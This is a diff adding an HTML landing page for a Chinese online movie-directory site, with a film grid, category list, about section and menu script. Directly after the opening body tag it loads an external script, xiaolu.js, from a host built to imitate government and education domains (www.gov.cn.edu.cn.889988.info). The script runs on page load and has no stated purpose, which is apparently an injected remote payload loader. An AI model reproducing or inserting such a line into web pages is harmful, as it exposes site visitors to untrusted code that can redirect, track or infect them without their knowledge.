@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>开心电影网 | 在线电影资源库 - 高清影视推荐与分类导航</title>
+<meta name="keywords" content="开心电影网,kaixindianyingwang,在线电影,高清影视,电影推荐,电影分类">
+<meta name="description" content="开心电影网（kaixindianyingwang）是一个专注于电影资源整理与分类导航的在线影视站点，提供热门电影推荐、影片分类检索与影视资讯，支持手机端自适应访问。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://kaixindianyingwang-wap.github.io/">
+<style>
+/* ===== 全局重置与基础 ===== */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0d0f1a;--bg2:#141828;--card:#1a1f33;--line:#262d44;
+  --txt:#eef1f8;--txt2:#9aa3bd;--brand:#ff3b5c;--brand2:#ff7a59;
+  --gold:#ffc94d;--ok:#34d399;--radius:14px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1100px;margin:0 auto;padding:0 18px}
+.btn{display:inline-block;padding:11px 22px;border-radius:30px;font-size:15px;font-weight:600;transition:.25s;border:1px solid transparent;cursor:pointer}
+.btn-main{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;box-shadow:0 6px 18px rgba(255,59,92,.35)}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 24px rgba(255,59,92,.45)}
+.btn-ghost{background:transparent;color:var(--txt);border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--brand);color:var(--brand)}
+.sec-title{display:flex;align-items:baseline;gap:10px;margin-bottom:6px}
+.sec-title h2{font-size:22px;letter-spacing:.5px}
+.sec-title span{color:var(--brand);font-size:13px;text-transform:uppercase;letter-spacing:2px}
+.sec-desc{color:var(--txt2);font-size:14px;margin-bottom:26px}
+section{padding:52px 0}
+.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;background:rgba(255,59,92,.14);color:var(--brand);border:1px solid rgba(255,59,92,.3)}
+
+/* ===== 顶部导航 ===== */
+header{position:sticky;top:0;z-index:99;background:rgba(13,15,26,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:800;letter-spacing:.5px}
+.logo i{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-style:normal;font-size:18px;box-shadow:0 4px 12px rgba(255,59,92,.4)}
+.nav-links{display:flex;gap:6px;align-items:center}
+.nav-links a{padding:8px 14px;border-radius:8px;font-size:15px;color:var(--txt2);transition:.2s}
+.nav-links a:hover{color:var(--txt);background:var(--card)}
+.nav-links a.act{color:#fff;background:linear-gradient(135deg,var(--brand),var(--brand2))}
+.menu-btn{display:none;background:none;border:0;color:#fff;font-size:26px;cursor:pointer}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:80px 0 70px;overflow:hidden;text-align:center;background:radial-gradient(1200px 500px at 50% -10%,rgba(255,59,92,.18),transparent 60%),radial-gradient(800px 400px at 80% 20%,rgba(255,122,89,.12),transparent 60%)}
+.hero h1{font-size:clamp(30px,6vw,52px);line-height:1.2;font-weight:900;margin:14px 0 6px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lead{color:var(--txt2);font-size:16px;max-width:640px;margin:14px auto 26px}
+.hero .btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.hero-stats{display:flex;gap:40px;justify-content:center;margin-top:44px;flex-wrap:wrap}
+.hero-stats div{text-align:center}
+.hero-stats b{display:block;font-size:26px;color:var(--gold)}
+.hero-stats small{color:var(--txt2);font-size:13px}
+
+/* ===== 电影卡网格 ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.mcard{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.28s;display:flex;flex-direction:column}
+.mcard:hover{transform:translateY(-6px);border-color:rgba(255,59,92,.5);box-shadow:0 14px 30px rgba(0,0,0,.4)}
+.poster{position:relative;aspect-ratio:3/4;overflow:hidden;background:linear-gradient(135deg,#232a42,#171b2b)}
+.poster svg{width:100%;height:100%}
+.poster .tag{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.65);backdrop-filter:blur(4px);padding:3px 9px;border-radius:6px;font-size:11px;color:var(--gold)}
+.poster .score{position:absolute;top:10px;right:10px;background:var(--brand);padding:3px 9px;border-radius:6px;font-size:12px;font-weight:700}
+.mcard .info{padding:12px 14px 16px;flex:1;display:flex;flex-direction:column}
+.mcard h3{font-size:16px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.mcard .meta{color:var(--txt2);font-size:12.5px;margin-bottom:12px}
+.mcard .more{margin-top:auto;font-size:13px;color:var(--brand);font-weight:600}
+
+/* ===== 分类栏目（列表型结构，与网格差异化） ===== */
+.cat-list{display:flex;flex-direction:column;gap:14px}
+.cat-row{display:flex;align-items:center;gap:18px;padding:18px 20px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--brand);border-radius:12px;transition:.25s}
+.cat-row:hover{border-left-color:var(--gold);background:var(--bg2);transform:translateX(4px)}
+.cat-ico{width:52px;height:52px;border-radius:12px;background:linear-gradient(135deg,var(--bg2),var(--card));border:1px solid var(--line);display:grid;place-items:center;font-size:24px;flex-shrink:0}
+.cat-row .txt{flex:1}
+.cat-row h3{font-size:17px;margin-bottom:3px}
+.cat-row p{color:var(--txt2);font-size:13.5px}
+.cat-row .num{font-size:13px;color:var(--txt2);white-space:nowrap}
+.cat-row .num b{color:var(--brand);font-size:18px}
+
+/* ===== 关于栏目 ===== */
+.about-box{background:linear-gradient(135deg,var(--card),var(--bg2));border:1px solid var(--line);border-radius:18px;padding:34px}
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.about-grid h2{font-size:26px;margin-bottom:14px}
+.about-grid p{color:var(--txt2);margin-bottom:12px;font-size:15px}
+.features{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:20px}
+.feat{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:16px}
+.feat b{display:block;font-size:15px;margin-bottom:4px}
+.feat span{font-size:13px;color:var(--txt2)}
+.url-show{background:var(--bg);border:1px dashed var(--brand);border-radius:12px;padding:16px;text-align:center}
+.url-show code{color:var(--gold);font-size:15px;word-break:break-all}
+
+/* ===== 页脚 ===== */
+footer{border-top:1px solid var(--line);padding:40px 0 30px;background:var(--bg2)}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:30px}
+.foot h4{font-size:15px;margin-bottom:14px;color:#fff}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:8px}
+.foot a{color:var(--txt2);font-size:14px}
+.foot a:hover{color:var(--brand)}
+.copy{margin-top:32px;padding-top:20px;border-top:1px solid var(--line);color:var(--txt2);font-size:13px;text-align:center}
+
+/* ===== 移动端 ===== */
+@media(max-width:820px){
+  .nav-links{position:fixed;top:64px;left:0;right:0;flex-direction:column;background:var(--bg2);padding:20px;border-bottom:1px solid var(--line);transform:translateY(-150%);transition:.35s;box-shadow:0 20px 40px rgba(0,0,0,.4)}
+  .nav-links.open{transform:translateY(0)}
+  .nav-links a{width:100%;text-align:center;padding:14px}
+  .menu-btn{display:block}
+  .hero{padding:56px 0 48px}
+  section{padding:40px 0}
+  .about-grid{grid-template-columns:1fr;gap:24px}
+  .foot{grid-template-columns:1fr}
+  .cat-row{flex-wrap:wrap;gap:12px}
+  .cat-row .num{width:100%;text-align:right}
+}
+@media(max-width:480px){
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .poster{border-radius:10px 10px 0 0}
+  .mcard .info{padding:10px}
+  .hero-stats{gap:24px}
+  .features{grid-template-columns:1fr}
+  .about-box{padding:22px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 导航 ===== -->
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#home" aria-label="开心电影网首页"><i>影</i>开心电影网</a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home" class="act">首页</a>
+      <a href="#library">电影库</a>
+      <a href="#category">分类导航</a>
+      <a href="#about">关于我们</a>
+      <a href="#" class="btn btn-ghost" style="margin-left:6px">登录</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== Hero / 首页 ===== -->
+<section id="home" class="hero">
+  <div class="wrap">
+    <span class="badge">kaixindianyingwang · 在线影视导航</span>
+    <h1>发现好电影，从<em>开心电影网</em>开始</h1>
+    <p class="lead">聚焦热门院线、经典高分与多元类型影片，提供清晰的分类检索与观影推荐，让你快速找到下一部值得看的电影。</p>
+    <div class="btns">
+      <a class="btn btn-main" href="#library">立即浏览电影库</a>
+      <a class="btn btn-ghost" href="#category">查看影片分类</a>
+    </div>
+    <div class="hero-stats">
+      <div><b>2000+</b><small>收录影片</small></div>
+      <div><b>12</b><small>影片分类</small></div>
+      <div><b>4K</b><small>高清资源</small></div>
+      <div><b>7×24</b><small>持续更新</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 电影库 ===== -->
+<section id="library">
+  <div class="wrap">
+    <div class="sec-title"><span>Movie Library</span><h2>热门电影库</h2></div>
+    <p class="sec-desc">精选各类型热门影片，持续更新院线与经典高分作品。</p>
+    <div class="grid">
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#3a1c5a"/><stop offset="1" stop-color="#7a2b5e"/></linearGradient></defs><rect width="120" height="160" fill="url(#g1)"/><text x="60" y="86" font-size="46" text-anchor="middle" fill="#ffd6e8">?</text></svg>
+          <span class="tag">科幻</span><span class="score">9.2</span>
+        </div>
+        <div class="info">
+          <h3>星际回响</h3>
+          <p class="meta">2025 · 科幻 / 冒险 · 148分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#1f4e5f"/><circle cx="60" cy="70" r="34" fill="#2e7d8f"/><text x="60" y="86" font-size="34" text-anchor="middle" fill="#c8f1f7">～</text></svg>
+          <span class="tag">剧情</span><span class="score">8.7</span>
+        </div>
+        <div class="info">
+          <h3>海上来信</h3>
+          <p class="meta">2024 · 剧情 / 文艺 · 122分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#5c2a2a"/><polygon points="60,40 88,100 32,100" fill="#c94c4c"/><text x="60" y="92" font-size="22" text-anchor="middle" fill="#ffd9a0">!</text></svg>
+          <span class="tag">动作</span><span class="score">8.4</span>
+        </div>
+        <div class="info">
+          <h3>极速突围</h3>
+          <p class="meta">2025 · 动作 / 犯罪 · 116分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#2a4a2a"/><path d="M20 130 Q60 60 100 130 Z" fill="#4caf50"/><circle cx="60" cy="58" r="14" fill="#a5d6a7"/></svg>
+          <span class="tag">动画</span><span class="score">9.0</span>
+        </div>
+        <div class="info">
+          <h3>森林物语</h3>
+          <p class="meta">2024 · 动画 / 奇幻 · 104分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#2a3a5c"/><rect x="30" y="40" width="60" height="70" fill="#5a7ab5" rx="6"/><rect x="44" y="110" width="32" height="8" fill="#5a7ab5"/></svg>
+          <span class="tag">悬疑</span><span class="score">8.9</span>
+        </div>
+        <div class="info">
+          <h3>暗室谜案</h3>
+          <p class="meta">2025 · 悬疑 / 惊悚 · 131分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#5c4a2a"/><path d="M30 130 L60 50 L90 130 Z" fill="#e0a030"/><circle cx="60" cy="46" r="10" fill="#fff2c8"/></svg>
+          <span class="tag">喜剧</span><span class="score">8.1</span>
+        </div>
+        <div class="info">
+          <h3>邻里奇遇</h3>
+          <p class="meta">2024 · 喜剧 / 温情 · 98分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#3a2a5c"/><path d="M40 40 L80 40 L90 80 L80 120 L40 120 L30 80 Z" fill="#8e6cd8"/><circle cx="60" cy="80" r="12" fill="#d4c0ff"/></svg>
+          <span class="tag">奇幻</span><span class="score">8.6</span>
+        </div>
+        <div class="info">
+          <h3>镜界之门</h3>
+          <p class="meta">2025 · 奇幻 / 冒险 · 140分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+      <article class="mcard">
+        <div class="poster">
+          <svg viewBox="0 0 120 160" xmlns="http://www.w3.org/2000/svg"><rect width="120" height="160" fill="#2a2a2a"/><path d="M60 30 L72 60 L105 60 L78 80 L88 115 L60 92 L32 115 L42 80 L15 60 L48 60 Z" fill="#ffd54f"/></svg>
+          <span class="tag">纪录</span><span class="score">9.1</span>
+        </div>
+        <div class="info">
+          <h3>深海纪元</h3>
+          <p class="meta">2024 · 纪录 / 自然 · 96分钟</p>
+          <span class="more">查看详情 →</span>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 分类导航 ===== -->
+<section id="category" style="background:linear-gradient(180deg,var(--bg),var(--bg2))">
+  <div class="wrap">
+    <div class="sec-title"><span>Categories</span><h2>影片分类导航</h2></div>
+    <p class="sec-desc">按题材与类型快速定位，多维度筛选更省时间。</p>
+    <div class="cat-list">
+
+      <a class="cat-row" href="#">
+        <div class="cat-ico">🎬</div>
+        <div class="txt"><h3>动作 / 冒险</h3><p>高能场面与紧张节奏，肾上腺素拉满</p></div>
+        <div class="num"><b>320</b> 部影片</div>
+      </a>
+      <a class="cat-row" href="#">
+        <div class="cat-ico">💖</div>
+        <div class="txt"><h3>爱情 / 剧情</h3><p>情感细腻，打动人心的故事</p></div>
+        <div class="num"><b>286</b> 部影片</div>
+      </a>
+      <a class="cat-row" href="#">
+        <div class="cat-ico">🔍</div>
+        <div class="txt"><h3>悬疑 / 惊悚</h3><p>反转不断，烧脑推理停不下来</p></div>
+        <div class="num"><b>198</b> 部影片</div>
+      </a>
+      <a class="cat-row" href="#">
+        <div class="cat-ico">👽</div>
+        <div class="txt"><h3>科幻 / 奇幻</h3><p>脑洞大开的世界观与视觉奇观</p></div>
+        <div class="num"><b>245</b> 部影片</div>
+      </a>
+      <a class="cat-row" href="#">
+        <div class="cat-ico">😂</div>
+        <div class="txt"><h3>喜剧 / 动画</h3><p>轻松解压，全家皆宜的欢乐时光</p></div>
+        <div class="num"><b>312</b> 部影片</div>
+      </a>
+      <a class="cat-row" href="#">
+        <div class="cat-ico">📽️</div>
+        <div class="txt"><h3>纪录 / 短片</h3><p>真实视角，看见世界的另一面</p></div>
+        <div class="num"><b>174</b> 部影片</div>
+      </a>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 关于我们 ===== -->
+<section id="about">
+  <div class="wrap">
+    <div class="about-box">
+      <div class="about-grid">
+        <div>
+          <div class="sec-title"><span>About Us</span><h2>关于开心电影网</h2></div>
+          <p>开心电影网（kaixindianyingwang）是一个专注于电影资源整理、影片分类与观影推荐的在线影视导航站，致力于帮助用户更快发现值得一看的好电影。</p>
+          <p>我们持续收录与整理院线热片、经典高分及多元类型影片，结合清晰的分类体系，让检索与发现更高效。</p>
+          <div class="features">
+            <div class="feat"><b>🎯 精选推荐</b><span>人工筛选，品质优先</span></div>
+            <div class="feat"><b>📱 移动友好</b><span>自适应布局，随时访问</span></div>
+            <div class="feat"><b>🔎 多维分类</b><span>类型 / 年份 / 评分筛选</span></div>
+            <div class="feat"><b>⚡ 快速加载</b><span>轻量结构，体验流畅</span></div>
+          </div>
+        </div>
+        <div class="url-show">
+          <h4 style="color:#fff;margin-bottom:10px">官方网站地址</h4>
+          <code>https://kaixindianyingwang-wap.github.io</code>
+          <p style="color:var(--txt2);font-size:13px;margin-top:12px">欢迎收藏与分享，持续关注更新。</p>
+          <a class="btn btn-main" href="#" style="margin-top:18px">提交影片建议</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo" style="margin-bottom:12px"><i>影</i>开心电影网</div>
+        <p style="color:var(--txt2);font-size:14px">发现好电影，从开心电影网开始。专注于电影资源整理与分类导航。</p>
+      </div>
+      <div>
+        <h4>快捷栏目</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#library">电影库</a></li>
+          <li><a href="#category">分类导航</a></li>
+          <li><a href="#about">关于我们</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>友情链接</h4>
+        <ul>
+          <li><a href="#">影视资讯</a></li>
+          <li><a href="#">观影指南</a></li>
+          <li><a href="#">评分排行</a></li>
+          <li><a href="#">联系合作</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">© 2026 开心电影网 kaixindianyingwang. 保留所有权利. | 网址：https://kaixindianyingwang-wap.github.io</div>
+  </div>
+</footer>
+
+<script>
+// 移动端菜单
+var menuBtn=document.getElementById('menuBtn');
+var navLinks=document.getElementById('navLinks');
+menuBtn.addEventListener('click',function(){navLinks.classList.toggle('open')});
+navLinks.addEventListener('click',function(e){if(e.target.tagName==='A')navLinks.classList.remove('open')});
+// 导航高亮
+var links=document.querySelectorAll('.nav-links a');
+var secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(window.scrollY>=s.offsetTop-120)cur=s.id});
+  links.forEach(function(a){a.classList.toggle('act',a.getAttribute('href')==='#'+cur)});
+});
+</script>
+</body>
+</html>
